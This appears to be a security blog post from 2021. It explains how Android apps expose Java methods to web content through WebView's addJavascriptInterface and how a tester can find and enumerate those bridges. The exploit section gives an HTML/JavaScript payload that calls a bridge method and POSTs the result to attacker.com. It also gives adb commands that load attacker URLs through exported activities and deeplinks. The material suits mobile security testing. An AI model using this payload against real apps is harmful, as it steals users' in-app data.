---
title: WebView and JavaScript bridge
description: >-
  While researching on android WebView vulnerabilities We got to know most of
  the mobile application uses WebView JavaScript bridge called…
date: '2021-01-09T20:53:59.588Z'
categories: []
keywords: []
slug: ''
---

While researching on android WebView vulnerabilities We got to know most of the mobile application uses WebView JavaScript bridge called JavascriptInterface in WebView.

JavascriptInterface allows the Java object’s methods to be accessed from JavaScript. For applications targeted to API level Build.VERSION\_CODES.JELLY\_BEAN\_MR1

class JsObject {  
    @JavascriptInterface  
    public String toString() { return "injectedObject"; }  
 }  
 webview.getSettings().setJavaScriptEnabled(true);  
 webView.addJavascriptInterface(new JsObject(), "injectedObject");  
 webView.loadData("", "text/html", null);  
 webView.loadUrl("javascript:alert(injectedObject.toString())");

**Vulnerability** 

> As the object is exposed to all the frames in WebView ,hence any frame can get object name and call methods on it.

**Steps to Identify If Android Application is using JavascriptInterface**

1.  The below command can be used to identify the presence of the JavascriptInterface (in the source code after decompiling the app )

$ grep -r -n -i "addJavascriptInterface" 

‌If the code built for API 17 (or above) and includes the ‘@JavascriptInterface’ annotation (The @JavascriptInterface annotation was introduced in Android 4.2, [JELLY\_BEAN\_MR1](https://android-developers.blogspot.com/2013/02/security-enhancements-in-jelly-bean.html) (Security Enhancements in Jelly Bean) to limit exposure to the reflection attack.)

$ grep -r -i "\\@JavascriptInterface"

2\. Or Simply Obtain the Source code of application and search for keyword “addJavascriptInterface” 

![](https://cdn-images-1.medium.com/max/800/1*iINomQ0HSGnkIqNsjByNwQ.png)
undefined

  

**Remote Debugging of Identified JavaScript Interface**

Once JavaScript Identified we can now examine the Interface using [Remote Debugging WebViews](https://developers.google.com/web/tools/chrome-devtools/remote-debugging/webviews) where remote debugging will connect to the WebView running on android device using Chrome and we can use Chrome’s developer console to test the javascriptinterface in WebView

For that **“setWebContentsDebuggingEnabled”** setting on the application should be enabled. 

If **“setWebContentsDebuggingEnabled”** was not enabled follow below steps to enble the **“setWebContentsDebuggingEnabled”** 

1.  Reverse the application using [Apktool](https://ibotpeaches.github.io/Apktool/)
2.  Add below code snippet into the bytecode of the application, ideally before any other bytecode executes. A suitable place will be entry point of classes of the app, e.g. the Main Activity of the application

```
const/4 v1, 0x01invoke-static {v1}, Landroid/webkit/WebView;->setWebContentsDebuggingEnabled(Z)V
```

3\. And rebuild the application using Apktool 

Now we can connect our Android Device WebView remotely to our chrome browser by navigating to “**chrome://inspect**”

The chrome://inspect page displays a list of debug-enabled WebView's on your device. To start debugging, click inspect below the WebView.

![](https://cdn-images-1.medium.com/max/800/1*V41J9D3N7z-UptTJG7elIA.png)

Now we can inspect every element of WebView in browser 

**Enumeration of Javascript Interface** 

Now we have the console of application WebView , we can list the all elements including JavaScript Interface using below console command

Object.getOwnPropertyNames(window).forEach(function(v, x) { console.log(v); });

![](https://cdn-images-1.medium.com/max/800/1*hGEbzVcwAOSateGJMOVU5g.png)

Now to retrieve the methods of listed elements use below console command 

Object.getOwnPropertyNames(window.**Nameoftheelement**).forEach(function(v, x) { console.log(v); });

![](https://cdn-images-1.medium.com/max/800/1*inJOu1ixFDOLCA1XnbZojg.png)

Once you have the list of all elements and methods you can call them 

document.write(Interfacename.JSON())

**Exploit**

For exploit, attackers needs to identify the way to load attacker-controlled URL in application WebView, where an attacker can host the below HTML with Identified JavaScript Interface 

<script>

x=Interfacename.Method()  //Vulnerable Interface name and Method  
send(x)

function send(data){  
var xhr = new XMLHttpRequest();  
 xhr.open("POST", "[https://attacker.com/](https://postb.in/1602795714465-0842880969867)", true);   
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");  
 xhr.send(data);

}</script>

**Using Exported Activity (Loading Arbitrary URL in WebView)**

adb shell am start -n com.vulnerableclass/VulnerableActivity -d “[https://attacker.com](https://attacker.com)"

**Using Vulnerable Deeplink**

adb shell am start  
        -W -a android.intent.action.VIEW  
        -d "example://gizmoslogin/?url=[http://attacker.com/](http://attacker.com/)" com.example.android

**Using URL** 

Attacker and Add the URL in application using functionality provided by application for e.g. share the URL to multiple Users etc.

Using Above steps you can find the JavaScript Interface elements and with help of them leak the information of WebView 

**Reference**

[**Abusing WebViews to Steal Files via Email**  
_A few months ago, I was testing the email functionality on a company's contact us page, when I sent an email to myself…_carvesystems.com](https://carvesystems.com/news/abusing-webviews-to-steal-files-via-email/ "https://carvesystems.com/news/abusing-webviews-to-steal-files-via-email/")[](https://carvesystems.com/news/abusing-webviews-to-steal-files-via-email/)

[**Remote Debugging WebViews | Chrome DevTools | Google Developers**  
_"type": "thumb-down", "id": "missingTheInformationINeed", "label":"Missing the information I need" },{ "type"…_developers.google.com](https://developers.google.com/web/tools/chrome-devtools/remote-debugging/webviews "https://developers.google.com/web/tools/chrome-devtools/remote-debugging/webviews")[](https://developers.google.com/web/tools/chrome-devtools/remote-debugging/webviews)

[**Abusing WebViews to Steal Files via Email**  
_A few months ago, I was testing the email functionality on a company's contact us page, when I sent an email to myself…_carvesystems.com](https://carvesystems.com/news/abusing-webviews-to-steal-files-via-email/ "https://carvesystems.com/news/abusing-webviews-to-steal-files-via-email/")[](https://carvesystems.com/news/abusing-webviews-to-steal-files-via-email/)

[**WebView addJavascriptInterface Remote Code Execution**  
_Recently we have been researching vulnerabilities within cross platform mobile application development frameworks…_labs.f-secure.com](https://labs.f-secure.com/archive/webview-addjavascriptinterface-remote-code-execution/ "https://labs.f-secure.com/archive/webview-addjavascriptinterface-remote-code-execution/")[](https://labs.f-secure.com/archive/webview-addjavascriptinterface-remote-code-execution/)

[**Twitter disclosed on HackerOne: Twitter lite(Android): Vulnerable...**  
_Summary:\*\* com.twitter.android.lite.TwitterLiteActivity is set to exported and doesn't validate data pass to intent due…_hackerone.com](https://hackerone.com/reports/499348 "https://hackerone.com/reports/499348")[](https://hackerone.com/reports/499348)
